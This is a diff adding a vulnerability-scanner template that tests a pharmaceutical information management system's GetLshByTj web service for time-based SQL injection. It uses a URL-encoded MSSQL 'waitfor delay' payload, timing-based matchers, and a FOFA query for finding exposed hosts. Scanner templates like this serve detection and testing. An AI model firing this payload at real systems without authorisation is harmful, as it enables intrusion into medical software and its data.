@@ -1,0 +1,26 @@
+id: medicine-system-sqli
+info:
+  name: 医药信息管理系统 GetLshByTj - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/c8b3f3242900ed52daaba0c9a8c5992298b740e8/%E5%8C%BB%E8%8D%AF%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGetLshByTj%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+  metadata:
+    verified: true
+    fofa-query: icon_hash="775044030"
+  tags: others,sqli,medicine,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /WebService.asmx/GetLshByTj?djcname=%31%27%3b%77%61%69%74%66%6f%72%20%64%65%6c%61%79%20%27%30%3a%30%3a%36%27%2d%2d%20%2d&redonly=true&tjstr=12 HTTP/1.1
+        Host: {{Hostname}}
+   
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
